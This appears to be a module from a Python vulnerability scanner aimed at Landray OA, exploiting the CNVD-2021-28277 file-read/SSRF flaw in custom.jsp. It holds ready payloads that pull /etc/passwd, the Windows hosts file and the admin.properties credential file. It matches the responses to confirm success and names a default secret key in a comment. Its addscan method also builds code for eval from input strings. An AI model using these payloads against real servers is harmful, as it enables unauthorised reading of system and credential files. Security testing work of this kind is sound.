#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
蓝凌是国内数字化办公专业服务商
    蓝凌OA扫描类: 
        蓝凌OA custom.jsp任意文件读取(SSRF)
            CNVD-2021-28277


file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

class Landray():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Landray-OA'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cnvd_2021_28277_payloads = [
            {
                'path': 'sys/ui/extend/varkind/custom.jsp',
                'data': 'var={"body":{"file":"file:///etc/passwd"}}'
            },
            {
                'path': 'sys/ui/extend/varkind/custom.jsp',
                'data': 'var={"body":{"file":"file://C:/Windows/System32/drivers/etc/hosts"}}'
            },
            {
                'path': 'sys/ui/extend/varkind/custom.jsp',
                'data': 'var={"body":{"file":"file://C:\Windows\System32\drivers\etc\hosts"}}'
            },
            {
                'path': 'sys/ui/extend/varkind/custom.jsp',
                'data': 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
            },
            {
                'path': 'custom.jsp',
                'data': 'var={"body":{"file":"file:///etc/passwd"}}'
            },
            {
                'path': 'custom.jsp',
                'data': 'var={"body":{"file":"file://C:/Windows/System32/drivers/etc/hosts"}}'
            },
            {
                'path': 'custom.jsp',
                'data': 'var={"body":{"file":"file://C:\Windows\System32\drivers\etc\hosts"}}'
            },
            {
                'path': 'custom.jsp',
                'data': 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
            },
        ]

    def cnvd_2021_28277_scan(self, url):
        '''  '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'SSRF'
        vul_info['vul_id'] = 'CNVD-2021-28277'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cnvd_2021_28277_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
                or (('Microsoft Corp' in res.text) 
                    and ('Microsoft TCP/IP for Windows' in res.text))
                or (('password' in res.text) and ('kmss.properties.encrypt.enabled = true' in res.text))
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res,
                    # 'Default SceretKey': 'kmssAdminKey'
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cnvd_2021_28277_scan, url=url)
        ]

landray = Landray()
